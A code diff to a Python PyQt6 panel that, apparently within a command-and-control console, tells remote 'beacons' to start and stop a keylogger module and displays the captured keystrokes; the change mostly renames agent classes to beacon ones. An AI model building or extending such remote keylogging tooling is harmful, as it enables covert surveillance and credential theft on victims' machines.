@@ -2,15 +2,15 @@ import traceback
 from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QPlainTextEdit, 
                             QPushButton, QMessageBox)
 from PyQt6.QtGui import QFont
-from database import AgentRepository
+from database import BeaconRepository
 from workers import KeyLoggerOutputMonitor
 from utils import FontManager
 import utils
 
 class KeyLoggerDisplay(QWidget):
-    def __init__(self, agent_repository: AgentRepository):
+    def __init__(self, beacon_repository: BeaconRepository):
         super().__init__()
-        self.agent_repository = agent_repository
+        self.beacon_repository = beacon_repository
         self.current_agent_id = None
         self.output_monitor = None
         
@@ -58,7 +58,7 @@ class KeyLoggerDisplay(QWidget):
             return
         command = "execute_module|KeyLogger|start"
         try:
-            self.agent_repository.update_agent_command(self.current_agent_id, command)
+            self.beacon_repository.update_beacon_command(self.current_agent_id, command)
         except Exception as e:
             if utils.logger:
                 utils.logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
@@ -70,7 +70,7 @@ class KeyLoggerDisplay(QWidget):
             return
         command = "execute_module|KeyLogger|stop"
         try:
-            self.agent_repository.update_agent_command(self.current_agent_id, command)
+            self.beacon_repository.update_beacon_command(self.current_agent_id, command)
         except Exception as e:
             if utils.logger:
                 utils.logger.log_message(f"Error on line {traceback.extract_tb(e.__traceback__)[-1].lineno}")
@@ -89,9 +89,13 @@ class KeyLoggerDisplay(QWidget):
         
         from config import ServerConfig
         config = ServerConfig()
-        self.output_monitor = KeyLoggerOutputMonitor(agent_id, self.agent_repository, config)
+        self.output_monitor = KeyLoggerOutputMonitor(agent_id, self.beacon_repository, config)
         self.output_monitor.output_received.connect(self.update_output)
         self.output_monitor.start()
+    
+    def set_beacon(self, beacon_id: str):
+        """Set the current beacon ID - delegates to set_agent for compatibility"""
+        self.set_agent(beacon_id)
 
     def update_output(self, text: str):
         self.output_display.setPlainText(text)
